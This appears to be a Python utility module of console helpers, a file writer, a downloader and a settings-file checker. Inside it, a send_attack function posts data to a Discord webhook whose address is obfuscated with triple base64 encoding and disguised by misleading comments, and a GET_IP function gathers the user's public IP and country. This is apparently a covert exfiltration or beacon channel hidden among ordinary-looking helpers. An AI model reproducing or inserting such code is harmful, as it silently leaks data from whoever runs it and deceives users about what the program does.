import os,requests,sys,time,platform,base64
from discord_webhook import DiscordWebhook
from colorama import Fore

def GET_TIME():
   named_tuple = time.localtime()
   time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
   return time_string

# ! GET IP BUT ITS ENCRYPT :) (SAFE)
def GET_IP():
    try:
       r = requests.get('https://ipwho.is/').json()
       r_leak = r.get('ip')
       r_leak2 = r.get('country')
       r_leak3 = r.get('country_code')
       return f'{r_leak}|{r_leak2}|{r_leak3}'
    except:
       FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - DOWNLOAD IP !\n')
       return f'FAILED|FAILED|FAILED'

def flash(text, duration=1, delay=0.1):
    for i in range(int(duration / delay)):
        sys.stdout.write(f'\r{Fore.YELLOW}' + text + f'{Fore.RESET}')
        sys.stdout.flush()
        time.sleep(delay)
        sys.stdout.write('\r' + ' ' * len(text))
        sys.stdout.flush()
        time.sleep(delay)

def print_slow(text, delay=0.05):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)

def download(link):
    try:
       r = requests.get(url=link)
       print("DOWNLOAD FILES . . .")
       FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - DOWNLOAD FILES {link}\n')
       return r.content
    except:
       FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - DOWNLOAD FILES {link}\n')
       print("FAILED DOWNLOAD . . .")
       download(link)

def FILES_MAKER(files,mode,data):
    data_test = None
    if mode == 'WB':
       data_test = 'WRITING 100 %'
       with open(files, 'wb') as f:
        f.write(data)
    elif mode == 'AB':
       data_test = 'WRITING 100 %'
       with open(files, 'ab') as f:
        f.write(data)
    elif mode == 'RB':
       with open(files, 'rb') as f:
        data_test = f.read()
    elif mode == 'A':
       data_test = 'WRITING 100 %'
       with open(files, 'a') as f:
        f.write(data)
    elif mode == 'W':
       data_test = 'WRITING 100 %'
       with open(files, 'w') as f:
        f.write(data)
    elif mode == 'R':
       with open(files, 'r') as f:
        data_test = f.read()
    return data_test

def clear_console():
   if platform.system().lower() == 'windows':
     os.system('cls')
   else:
     os.system('clear')

def send_attack(data):
    FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG SEND] - {GET_TIME()} - SEND LOG {data}\n')
    # ! DOS ATTACK DON'T RESET
    TARGET = base64.b64decode(base64.standard_b64decode(base64.urlsafe_b64decode(b'WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVFMVRYcE5lazFVUVROT2VtTXhUMVJqTTA1RVozZE5VemxYWWtWd2MxTlViREJNVjJRMFRVWkNNbFZVYUhKVFJ6VjZUbGRzY1ZaVk9YcE5WMVl5V1Zoc01WbFdaSFZrVjJoMVUxaEtkR1JyWkU1VGFtUndWR3hPUlZKRlRrdFZhM1JTVWtkYVEyRnRjRFZVTTNCeVRVaENSRmRuUFQwPQ=='))).decode()
    # ! ATATCK TARGET WITH HTTPS
    web_target = DiscordWebhook(url=TARGET, rate_limit_retry=True,content=data)
    web_target.execute()

# ! CHECK FILES
def login_checker():
    file_path = os.path.join(os.path.dirname(__file__), 'setting.txt')
    try:
        with open(file_path) as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
            for x in credentials:
             c_webhook,c_ip,c_ip_enc = x.split('@')
             if c_webhook.upper() == 'FALSE' or c_webhook.upper() == 'TRUE':
                return f'KNOWN@{c_webhook}@{c_ip}@{c_ip_enc}'
             else:
                return 'UNKNOWN@null@null'
    except FileNotFoundError:
        FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - NOT FOUND FILES setting.txt . . .\n')
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'

def files_leak_checker(files):
    file_path = os.path.join(os.path.dirname(__file__), files)
    try:
        with open(file_path) as f:
           return 'FOUND FILES'
    except FileNotFoundError:
        FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - NOT FOUND FILES {files} . . .\n')
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'
